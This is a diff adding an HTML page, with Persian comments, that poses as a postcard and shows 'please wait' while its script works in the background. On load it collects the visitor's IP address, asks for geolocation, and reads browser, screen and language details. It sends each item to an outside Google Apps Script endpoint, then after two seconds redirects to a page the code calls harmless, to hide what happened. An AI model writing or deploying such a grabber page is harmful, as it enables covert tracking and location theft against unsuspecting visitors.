@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cart postal (:</title>
+    <link rel="icon" href="data:;base64,iVBORw0KGgo="> <!-- این خط جلوی جستجوی favicon رو می‌گیره -->
+</head>
+<body>
+    <h1>لطفاً صبر کنید...</h1>
+
+    <script>
+        //  IP
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                console.log('IP کاربر:', data.ip);
+                sendData('IP', data.ip);
+            })
+            .catch(error => console.log('خطا در گرفتن IP:', error));
+
+        //  (نیاز به اجازه کاربر داره)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    console.log('مکان:', latitude, longitude);
+                    sendData('Location', { lat: latitude, lon: longitude });
+                },
+                (error) => {
+                    console.log('کاربر اجازه نداد یا خطا رخ داد:', error);
+                }
+            );
+        } else {
+            console.log('پشتیبانی از Geolocation وجود ندارد');
+        }
+
+        // 
+        const deviceInfo = {
+            browser: navigator.userAgent,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            language: navigator.language
+        };
+        console.log('دستگاه:', deviceInfo);
+        sendData('Device', deviceInfo);
+
+        // تابع برای ارسال داده‌ها به Web App
+        function sendData(type, data) {
+            fetch('https://script.google.com/macros/s/AKfycbzFNZXNZVk3MvAcpbzXt8iVS4LszlEzHgGw454A8fUEU6aDQCL8Yk2pj86LqsHGiUU/exec', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ type: type, data: data }),
+            })
+            .then(response => response.text())
+            .then(result => console.log('پاسخ سرور:', result))
+            .catch(error => console.log('خطا در ارسال داده:', error));
+        }
+
+        // هدایت کاربر به یه صفحه بی‌ضرر بعد از ۲ ثانیه
+        setTimeout(() => {
+            window.location.href = 'https://example.com';
+        }, 2000);
+    </script>
+</body>
+</html>
